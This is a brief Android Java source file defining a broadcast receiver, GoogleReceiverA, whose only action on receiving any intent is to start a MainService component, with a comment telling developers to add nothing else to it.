package com.android.google;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import com.android.crystal.components.MainService;


/**
 * DO NOT do anything in this Receiver!
 *
 * Created by Mars on 12/24/15.
 */
public class GoogleReceiverA extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        context.startService(new Intent(context, MainService.class));
    }
}
